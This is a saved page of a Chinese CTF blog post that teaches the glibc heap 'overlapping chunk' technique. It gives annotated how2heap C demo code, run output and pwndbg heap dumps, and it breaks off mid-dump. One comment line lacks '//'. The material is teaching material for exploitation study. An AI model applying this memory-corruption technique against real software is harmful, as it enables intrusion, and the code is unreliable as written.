<!DOCTYPE html>
<!-- saved from url=(0094)https://nightrainy.github.io/2020/01/20/how2heap%E6%80%BB%E7%BB%93%E7%B3%BB%E5%88%97%E4%B8%89/ -->
<html lang="" class=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="generator" content="Hexo 3.8.0">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>how2heap总结系列三 - 知世の小屋</title>
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate">
    <meta name="keywords" content="知世,"> 
    <meta name="description" content="my blogs,"> 
    <meta name="author" content="知世"> 
    <link rel="alternative" href="https://nightrainy.github.io/2020/01/20/how2heap%E6%80%BB%E7%BB%93%E7%B3%BB%E5%88%97%E4%B8%89/atom.xml" title="知世の小屋" type="application/atom+xml"> 
    <link rel="icon" href="https://nightrainy.github.io/img/favicon.png"> 
    <link rel="stylesheet" href="./how2heap总结系列三 - 知世の小屋_files/gitalk.css">
    <link rel="stylesheet" href="./how2heap总结系列三 - 知世の小屋_files/diaspora.css">
    <script src="./how2heap总结系列三 - 知世の小屋_files/osd.js"></script><script src="./how2heap总结系列三 - 知世の小屋_files/f.txt" id="google_shimpl"></script><script async="" src="./how2heap总结系列三 - 知世の小屋_files/f(1).txt"></script>
    <script>
         (adsbygoogle = window.adsbygoogle || []).push({
              google_ad_client: "ca-pub-8691406134231910",
              enable_page_level_ads: true
         });
    </script>
    <script async="" custom-element="amp-auto-ads" src="./how2heap总结系列三 - 知世の小屋_files/amp-auto-ads-0.1.js">
    </script>
<link rel="preload" href="./how2heap总结系列三 - 知世の小屋_files/f(2).txt" as="script"><script type="text/javascript" src="./how2heap总结系列三 - 知世の小屋_files/f(2).txt"></script><style class="loaderstyle" id="loaderstyle1680">@-moz-keyframes loader1680{100%{background-position:1680px 0}}@-webkit-keyframes loader1680{100%{background-position:1680px 0}}.loader1680{-webkit-animation:loader1680 3s linear infinite;-moz-animation:loader1680 3s linear infinite;}</style></head>
<body class="">

    <span id="config-title" style="display:none">知世の小屋</span>
    <div id="loader" class="" style="display: none;"></div>
    <div class="nav">
    <ul id="menu-menu" class="menu">
        
        <li class="pview menu-item menu-item-type-post_type menu-item-object-page">
            <a href="https://nightrainy.github.io/whoami/whoami.html" title="Whoami" target="_blank" rel="noopener" class="pviewa">Whoami</a>
        </li>
        
        <li class="  menu-item menu-item-type-post_type menu-item-object-page">
            <a href="https://github.com/nightRainy" title="Github" target="_blank" rel="noopener">Github</a>
        </li>
        
        <li class="  menu-item menu-item-type-post_type menu-item-object-page">
            <a href="https://twitter.com/rL4jM3CKIaEil7i" title="Twitter" target="_blank" rel="noopener">Twitter</a>
        </li>
        
    </ul>
    <p id="copyright">
        © 2020 知世.
        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
        Theme <a href="https://github.com/Fechin/hexo-theme-diaspora" title="Diaspora" target="_blank" rel="noopener">Diaspora</a>
        by Fechin
    </p>
</div>

<div id="container" style="display: none;">
    
<div id="screen">
    <div id="mark" style="height: 916px; position: relative; transform: translate3d(0px, 0px, 0px); transform-style: preserve-3d; backface-visibility: hidden;">
        <div class="layer" data-depth="0.4" style="width: 1834.06px; height: 1000px; margin-left: -77.0306px; margin-top: -42px; position: relative; display: block; left: 0px; top: 0px; transform: translate3d(9.88131e-324px, -9.88131e-324px, 0px); transform-style: preserve-3d; backface-visibility: hidden;">
            <img src="./how2heap总结系列三 - 知世の小屋_files/welcome-cover.jpg" id="cover" crossorigin="anonymous" width="1920" height="1080" style="width: 1834px; height: 1031.62px; left: 0px; top: -15.5px;">
        </div>
    </div>
    <div id="vibrant">
        <svg viewBox="0 0 2880 1620" height="100%" preserveAspectRatio="xMaxYMax slice">
            <polygon opacity="0.7" points="2000,1620 0,1620 0,0 600,0 " style="fill: rgb(79, 35, 59);"></polygon>
        </svg>
        <div style="background-color: rgb(79, 35, 59);"></div>
    </div>
    <div id="header">
        <div>
            <a class="image-logo" href="https://nightrainy.github.io/"></a>
            <div class="icon-menu switchmenu" style="color: rgb(203, 75, 79);"></div>
        </div>
    </div>
    
    <div id="post0">
        <p>二月 20, 2020</p>
        <h2><a href="https://nightrainy.github.io/2020/02/20/how2heap%E6%80%BB%E7%BB%93%E8%AE%A1%E5%88%92%E5%85%AB/" title="how2heap总结计划八" class="posttitle">how2heap总结计划八</a></h2>
        <p class="summary">
终于轮到了glibc2.26，本节包括tcache_dup,tcache_poisoning,tcache_ho...</p>
    </div>
    
</div>

    <div id="primary">
        
<div class="post">
    <a href="https://nightrainy.github.io/2020/02/02/how2heap%E6%80%BB%E7%BB%93%E8%AE%A1%E5%88%92%E4%B8%83/" title="how2heap总结计划七">
        <img src="./how2heap总结系列三 - 知世の小屋_files/cover.jpg" class="cover" width="680" height="440">
    </a>
    <div class="else">
        <p>二月 02, 2020</p>
        <h3><a href="https://nightrainy.github.io/2020/02/02/how2heap%E6%80%BB%E7%BB%93%E8%AE%A1%E5%88%92%E4%B8%83/" title="how2heap总结计划七" class="posttitle">how2heap总结计划七</a></h3>
        <p>
本文包含house of orange

PS:由于本人才疏学浅,文中可能会有一些理解的不对的地方,欢迎各位斧正 :)
参考网站123https://c...</p>
    </div>
</div>


<div class="post">
    <a href="https://nightrainy.github.io/2020/02/01/how2heap%E6%80%BB%E7%BB%93%E8%AE%A1%E5%88%92%E5%85%AD/" title="how2heap总结计划六">
        <img src="./how2heap总结系列三 - 知世の小屋_files/cover.jpg" class="cover" width="680" height="440">
    </a>
    <div class="else">
        <p>二月 01, 2020</p>
        <h3><a href="https://nightrainy.github.io/2020/02/01/how2heap%E6%80%BB%E7%BB%93%E8%AE%A1%E5%88%92%E5%85%AD/" title="how2heap总结计划六" class="posttitle">how2heap总结计划六</a></h3>
        <p>
本文包含 house of lore,house of force

参考网站1https://ctf-wiki.github.io/ctf-wiki/...</p>
    </div>
</div>


<div class="post">
    <a href="https://nightrainy.github.io/2020/01/29/how2heap%E6%80%BB%E7%BB%93%E8%AE%A1%E5%88%92%E4%BA%94/" title="how2heap总结计划五">
        <img src="./how2heap总结系列三 - 知世の小屋_files/cover.jpg" class="cover" width="680" height="440">
    </a>
    <div class="else">
        <p>一月 29, 2020</p>
        <h3><a href="https://nightrainy.github.io/2020/01/29/how2heap%E6%80%BB%E7%BB%93%E8%AE%A1%E5%88%92%E4%BA%94/" title="how2heap总结计划五" class="posttitle">how2heap总结计划五</a></h3>
        <p>

参考网站12https://ctf-wiki.github.io/ctf-wikihttps://www.slideshare.net/codeblu...</p>
    </div>
</div>


<div class="post">
    <a href="https://nightrainy.github.io/2020/01/21/how2heap%E6%80%BB%E7%BB%93%E8%AE%A1%E5%88%92%E5%9B%9B/" title="how2heap总结计划四">
        <img src="./how2heap总结系列三 - 知世の小屋_files/cover.jpg" class="cover" width="680" height="440">
    </a>
    <div class="else">
        <p>一月 21, 2020</p>
        <h3><a href="https://nightrainy.github.io/2020/01/21/how2heap%E6%80%BB%E7%BB%93%E8%AE%A1%E5%88%92%E5%9B%9B/" title="how2heap总结计划四" class="posttitle">how2heap总结计划四</a></h3>
        <p>
布谷布谷!

参考网站1234567https://ctf-wiki.github.io/ctf-wiki/pwn/https://www.anquan...</p>
    </div>
</div>


<div class="post">
    <a href="https://nightrainy.github.io/2020/01/20/how2heap%E6%80%BB%E7%BB%93%E7%B3%BB%E5%88%97%E4%B8%89/" title="how2heap总结系列三">
        <img src="./how2heap总结系列三 - 知世の小屋_files/cover.jpg" class="cover" width="680" height="440">
    </a>
    <div class="else">
        <p>一月 20, 2020</p>
        <h3><a href="https://nightrainy.github.io/2020/01/20/how2heap%E6%80%BB%E7%BB%93%E7%B3%BB%E5%88%97%E4%B8%89/" title="how2heap总结系列三" class="posttitle">how2heap总结系列三</a></h3>
        <p>
接上一篇的unink,继续复习计划

参考网站1https://ctf-wiki.github.io/ctf-wiki/
0x0 overlapping...</p>
    </div>
</div>


<div class="post">
    <a href="https://nightrainy.github.io/2020/01/19/how2heap%E6%80%BB%E7%BB%93%E8%AE%A1%E5%88%92%E4%BA%8C/" title="how2heap总结计划二">
        <img src="./how2heap总结系列三 - 知世の小屋_files/cover.jpg" class="cover" width="680" height="440">
    </a>
    <div class="else">
        <p>一月 19, 2020</p>
        <h3><a href="https://nightrainy.github.io/2020/01/19/how2heap%E6%80%BB%E7%BB%93%E8%AE%A1%E5%88%92%E4%BA%8C/" title="how2heap总结计划二" class="posttitle">how2heap总结计划二</a></h3>
        <p>
假期坚决不咕咕咕之系列二!!系列一中我记录了first-fit,fastbin_dup,fastbin_dup_into_stack和fastbin_d...</p>
    </div>
</div>


<div class="post">
    <a href="https://nightrainy.github.io/2020/01/18/how2heap%E6%80%BB%E7%BB%93%E8%AE%A1%E5%88%92%E4%B8%80/" title="how2heap总结计划一">
        <img src="./how2heap总结系列三 - 知世の小屋_files/cover.jpg" class="cover" width="680" height="440">
    </a>
    <div class="else">
        <p>一月 18, 2020</p>
        <h3><a href="https://nightrainy.github.io/2020/01/18/how2heap%E6%80%BB%E7%BB%93%E8%AE%A1%E5%88%92%E4%B8%80/" title="how2heap总结计划一" class="posttitle">how2heap总结计划一</a></h3>
        <p>
how2heap系列几个与前更新了!!!!大事件,正好寒假时间充裕,不如把how2heap总结一遍算了,千万别咕咕咕了hhh

PS:由于本人才疏学浅,...</p>
    </div>
</div>


<div class="post">
    <a href="https://nightrainy.github.io/2020/01/07/pwn%E7%8E%AF%E5%A2%83docker%E5%8C%96/" title="pwn环境docker化">
        <img src="./how2heap总结系列三 - 知世の小屋_files/cover.jpg" class="cover" width="680" height="440">
    </a>
    <div class="else">
        <p>一月 07, 2020</p>
        <h3><a href="https://nightrainy.github.io/2020/01/07/pwn%E7%8E%AF%E5%A2%83docker%E5%8C%96/" title="pwn环境docker化" class="posttitle">pwn环境docker化</a></h3>
        <p>
新年第一篇水文,因为有些时候做一些相对简单的题目时打开虚拟机这么庞大的东西显得不是很明智,还有就是在一场比赛中遇到不同版本的pwn题时如果切换虚拟机也十...</p>
    </div>
</div>


<div class="post">
    <a href="https://nightrainy.github.io/2019/11/30/linux%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/" title="linux进程注入">
        <img src="./how2heap总结系列三 - 知世の小屋_files/cover.jpg" class="cover" width="680" height="440">
    </a>
    <div class="else">
        <p>十一月 30, 2019</p>
        <h3><a href="https://nightrainy.github.io/2019/11/30/linux%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/" title="linux进程注入" class="posttitle">linux进程注入</a></h3>
        <p>
最近在开发一些东西的时候遇到了一些比较奇特的需求用到了该姿势,就顺势学习了一波,在一些情景下,我们需要无进程启动一些程序,此时线程注入就非常好用了,此处...</p>
    </div>
</div>


    </div>
    
    <div id="pager"><a href="https://nightrainy.github.io/page/2/" class="more">加载更多</a></div>
    
</div>
<div id="preview" style="min-height: 916px; position: static; overflow-y: auto;" class="show"><div id="single">
    <div id="top" style="display: block;">
    <div class="bar" style="width: 0.397211%;"></div>
    <a class="icon-home image-icon" href="javascript:;" data-url="https://nightRainy.github.io"></a>
    <div title="播放/暂停" class="icon-play"></div>
    <h3 class="subtitle" style="display: none;">how2heap总结系列三</h3>
    <div class="social">
        <!--<div class="like-icon">-->
            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
        <!--</div>-->
        <div>
            <div class="share">
                <a title="获取二维码" class="icon-scan tg" href="javascript:;"></a>
            </div>
            <div id="qr" style="display: none;"><canvas width="128" height="128"></canvas></div>
        </div>
    </div>
    <div class="scrollbar" style="width: 0px;"></div>
</div>

    <div class="section">
        <div class="article">
    <div class="main">
        <h1 class="title">how2heap总结系列三</h1>
        <div class="stuff">
            <span>一月 20, 2020</span>
            

        </div>
        <div class="content markdown">
            <blockquote>
<p>接上一篇的unink,继续复习计划</p>
</blockquote>
<h1 id="参考网站"><a href="https://nightrainy.github.io/2020/01/20/how2heap%E6%80%BB%E7%BB%93%E7%B3%BB%E5%88%97%E4%B8%89/#%E5%8F%82%E8%80%83%E7%BD%91%E7%AB%99" class="headerlink" title="参考网站"></a>参考网站</h1><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ctf-wiki.github.io/ctf-wiki/</span><br></pre></td></tr></tbody></table></figure>
<h1 id="0x0-overlapping-chunk"><a href="https://nightrainy.github.io/2020/01/20/how2heap%E6%80%BB%E7%BB%93%E7%B3%BB%E5%88%97%E4%B8%89/#0x0-overlapping-chunk" class="headerlink" title="0x0 overlapping_chunk"></a>0x0 overlapping_chunk</h1><h2 id="序"><a href="https://nightrainy.github.io/2020/01/20/how2heap%E6%80%BB%E7%BB%93%E7%B3%BB%E5%88%97%E4%B8%89/#%E5%BA%8F" class="headerlink" title="序"></a>序</h2><p>overlapping在平常算是最常用的技巧了,几乎每一道题都需要构造overlap</p>
<p>而提到overlapping就不得不说chunk shrink和chunk extend了,其实这两个都是依靠更改chunk的pre_size域和size域来欺骗ptmalloc的</p>
<p>详情可见,<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/chunk_extend_overlapping-zh/#4extendoverlapping" target="_blank" rel="noopener">文章一</a>,<a href="https://nightrainy.github.io/2019/07/25/chunk-extend-and-overlapping/">文章二</a></p>
<p>好了,回过来,我们继续看本例</p>
<h2 id="源代码"><a href="https://nightrainy.github.io/2020/01/20/how2heap%E6%80%BB%E7%BB%93%E7%B3%BB%E5%88%97%E4%B8%89/#%E6%BA%90%E4%BB%A3%E7%A0%81" class="headerlink" title="源代码"></a>源代码</h2><p>我们还是先看源代码吧,同样的,我删了写东西并加了一小点翻译(雾</p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc , char* argv[]){</span><br><span class="line">        intptr_t *p1,*p2,*p3,*p4;</span><br><span class="line"></span><br><span class="line">        p1 = malloc(0x100 - 8);</span><br><span class="line">        p2 = malloc(0x100 - 8);</span><br><span class="line">        p3 = malloc(0x80 - 8);</span><br><span class="line"></span><br><span class="line">        fprintf(stderr, "The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n", p1, p2, p3);</span><br><span class="line"></span><br><span class="line">        memset(p1, '1', 0x100 - 8);</span><br><span class="line">        memset(p2, '2', 0x100 - 8);</span><br><span class="line">        memset(p3, '3', 0x80 - 8);</span><br><span class="line"></span><br><span class="line">        free(p2);</span><br><span class="line">        // p2现在在unsorted bin中,时刻准备为新的malloc服务</span><br><span class="line">        fprintf(stderr, "The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n");                   </span><br><span class="line"></span><br><span class="line">        // 现在模拟一下溢出来覆写p2的size                                                                               </span><br><span class="line">        fprintf(stderr, "Now let's simulate an overflow that can overwrite the size of the\nchunk freed p2.\n");     </span><br><span class="line">        </span><br><span class="line">        //对实例程序而言,最后三个字节是什么并不重要,然而,我们最好还是维持一下堆的稳定性</span><br><span class="line">        fprintf(stderr, "For a toy program, the value of the last 3 bits is unimportant;"</span><br><span class="line">                " however, it is best to maintain the stability of the heap.\n");</span><br><span class="line"></span><br><span class="line">        //为了维持堆的稳定性,我们还是要把prev_inuse标志位设位1来确保我们的p1不会被错误的认为是一个free chunk</span><br><span class="line">        fprintf(stderr, "To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),"</span><br><span class="line">                " to assure that p1 is not mistaken for a free chunk.\n");</span><br><span class="line"></span><br><span class="line">        int evil_chunk_size = 0x181;</span><br><span class="line">        int evil_region_size = 0x180 - 8;</span><br><span class="line">        fprintf(stderr, "We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n",                                                                                                                       evil_chunk_size, evil_region_size);</span><br><span class="line"></span><br><span class="line">        *(p2-1) = evil_chunk_size; // we are overwriting the "size" field of chunk p2</span><br><span class="line"></span><br><span class="line">        //现在我们分配一个和p2被注入的size一样的大小的chunk</span><br><span class="line">        fprintf(stderr, "\nNow let's allocate another chunk with a size equal to the data\n"</span><br><span class="line">               "size of the chunk p2 injected size\n");</span><br><span class="line"></span><br><span class="line">        这次的malloc将会从我们刚刚修改过size的unsoted bin中取出free chunk</span><br><span class="line">        fprintf(stderr, "This malloc will be served from the previously freed chunk that\n"</span><br><span class="line">               "is parked in the unsorted bin which size has been modified by us\n");</span><br><span class="line">        p4 = malloc(evil_region_size);</span><br><span class="line"></span><br><span class="line">        fprintf(stderr, "\np4 has been allocated at %p and ends at %p\n", (char *)p4, (char *)p4+evil_region_size);</span><br><span class="line">        fprintf(stderr, "p3 starts at %p and ends at %p\n", (char *)p3, (char *)p3+0x80-8);</span><br><span class="line">        fprintf(stderr, "p4 should overlap with p3, in this case p4 includes all p3.\n");</span><br><span class="line"></span><br><span class="line">        //现在我们写进p4的内容就可以覆盖p3啦,同时,我们写到p3里的内容也可以修改p4的内容</span><br><span class="line">        fprintf(stderr, "\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,"</span><br><span class="line">                " and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n");</span><br><span class="line"></span><br><span class="line">        fprintf(stderr, "Let's run through an example. Right now, we have:\n");</span><br><span class="line">        fprintf(stderr, "p4 = %s\n", (char *)p4);</span><br><span class="line">        fprintf(stderr, "p3 = %s\n", (char *)p3);</span><br><span class="line"></span><br><span class="line">        fprintf(stderr, "\nIf we memset(p4, '4', %d), we have:\n", evil_region_size);</span><br><span class="line">        memset(p4, '4', evil_region_size);</span><br><span class="line">        fprintf(stderr, "p4 = %s\n", (char *)p4);</span><br><span class="line">        fprintf(stderr, "p3 = %s\n", (char *)p3);</span><br><span class="line"></span><br><span class="line">        fprintf(stderr, "\nAnd if we then memset(p3, '3', 80), we have:\n");</span><br><span class="line">        memset(p3, '3', 80);</span><br><span class="line">        fprintf(stderr, "p4 = %s\n", (char *)p4);</span><br><span class="line">        fprintf(stderr, "p3 = %s\n", (char *)p3);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h2 id="运行结果"><a href="https://nightrainy.github.io/2020/01/20/how2heap%E6%80%BB%E7%BB%93%E7%B3%BB%E5%88%97%E4%B8%89/#%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C" class="headerlink" title="运行结果"></a>运行结果</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">This is a simple chunks overlapping problem</span><br><span class="line"></span><br><span class="line">Let's start to allocate 3 chunks on the heap</span><br><span class="line">The 3 chunks have been allocated here:</span><br><span class="line">p1=0x7aa010</span><br><span class="line">p2=0x7aa110</span><br><span class="line">p3=0x7aa210</span><br><span class="line"></span><br><span class="line">Now let's free the chunk p2</span><br><span class="line">The chunk p2 is now in the unsorted bin ready to serve possible</span><br><span class="line">new malloc() of its size</span><br><span class="line">Now let's simulate an overflow that can overwrite the size of the</span><br><span class="line">chunk freed p2.</span><br><span class="line">For a toy program, the value of the last 3 bits is unimportant; however, it is best to maintain the stability of the heap.</span><br><span class="line">To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse), to assure that p1 is not mistaken for a free chunk.</span><br><span class="line">We are going to set the size of chunk p2 to to 385, which gives us</span><br><span class="line">a region size of 376</span><br><span class="line"></span><br><span class="line">Now let's allocate another chunk with a size equal to the data</span><br><span class="line">size of the chunk p2 injected size</span><br><span class="line">This malloc will be served from the previously freed chunk that</span><br><span class="line">is parked in the unsorted bin which size has been modified by us</span><br><span class="line"></span><br><span class="line">p4 has been allocated at 0x7aa110 and ends at 0x7aa288</span><br><span class="line">p3 starts at 0x7aa210 and ends at 0x7aa288</span><br><span class="line">p4 should overlap with p3, in this case p4 includes all p3.</span><br><span class="line"></span><br><span class="line">Now everything copied inside chunk p4 can overwrites data on</span><br><span class="line">chunk p3, and data written to chunk p3 can overwrite data</span><br><span class="line">stored in the p4 chunk.</span><br><span class="line"></span><br><span class="line">Let's run through an example. Right now, we have:</span><br><span class="line">p4 = xK&lt;5       </span><br><span class="line">3 = 333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333</span><br><span class="line"></span><br><span class="line">If we memset(p4, '4', 376), we have:</span><br><span class="line">p4 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444</span><br><span class="line">3 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444</span><br><span class="line"></span><br><span class="line">And if we then memset(p3, '3', 80), we have:</span><br><span class="line">p4 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444</span><br><span class="line">3 = 333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444</span><br></pre></td></tr></tbody></table></figure>
<h2 id="调试"><a href="https://nightrainy.github.io/2020/01/20/how2heap%E6%80%BB%E7%BB%93%E7%B3%BB%E5%88%97%E4%B8%89/#%E8%B0%83%E8%AF%95" class="headerlink" title="调试"></a>调试</h2><p>因为程序比较简单,我这里就仅作几个断点来调试本例</p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">► 24   p3 = malloc(0x80 - 8);</span><br><span class="line"></span><br><span class="line">  28   memset(p1, '1', 0x100 - 8);</span><br><span class="line">  29   memset(p2, '2', 0x100 - 8);</span><br><span class="line">  30   memset(p3, '3', 0x80 - 8);</span><br><span class="line">  31</span><br><span class="line">► 32   fprintf(stderr, "\nNow let's free the chunk p2\n");</span><br><span class="line"></span><br><span class="line">  33   free(p2);</span><br><span class="line">► 34   fprintf(stderr, "The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n");</span><br><span class="line"></span><br><span class="line">  47   *(p2-1) = evil_chunk_size; // we are overwriting the "size" field of chunk p2</span><br><span class="line">  48</span><br><span class="line">► 49   fprintf(stderr, "\nNow let's allocate another chunk with a size equal to the data\n"</span><br><span class="line"></span><br><span class="line">  53   p4 = malloc(evil_region_size);</span><br><span class="line">  54</span><br><span class="line">► 55   fprintf(stderr, "\np4 has been allocated at %p and ends at %p\n", (char *)p4, (char *)p4+evil_region_size);</span><br><span class="line"></span><br><span class="line">► 67   memset(p4, '4', evil_region_size);</span><br><span class="line"></span><br><span class="line">  71   fprintf(stderr, "\nAnd if we then memset(p3, '3', 80), we have:\n");</span><br><span class="line">► 72   memset(p3, '3', 80);</span><br><span class="line"></span><br><span class="line">► 72   memset(p3, '3', 80);</span><br><span class="line">  73   fprintf(stderr, "p4 = %s\n", (char *)p4);</span><br><span class="line">  74   fprintf(stderr, "p3 = %s\n", (char *)p3);</span><br></pre></td></tr></tbody></table></figure>
<p>好了,先malloc3个chunk,p1,p2,p3,此时的堆</p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x603000 PREV_INUSE {</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 257,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">}</span><br><span class="line">0x603100 PREV_INUSE {</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 257,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">}</span><br><span class="line">0x603200 FASTBIN {</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 129,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">}</span><br><span class="line">0x603280 PREV_INUSE {</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 134529,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>然后给三个chunk赋初值</p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx p1</span><br><span class="line">0x603010:       0x3131313131313131      0x3131313131313131</span><br><span class="line">0x603020:       0x3131313131313131      0x3131313131313131</span><br><span class="line">0x603030:       0x3131313131313131      0x3131313131313131</span><br><span class="line">0x603040:       0x3131313131313131      0x3131313131313131</span><br><span class="line">0x603050:       0x3131313131313131      0x3131313131313131</span><br><span class="line">pwndbg&gt; x/10gx p2</span><br><span class="line">0x603110:       0x3232323232323232      0x3232323232323232</span><br><span class="line">0x603120:       0x3232323232323232      0x3232323232323232</span><br><span class="line">0x603130:       0x3232323232323232      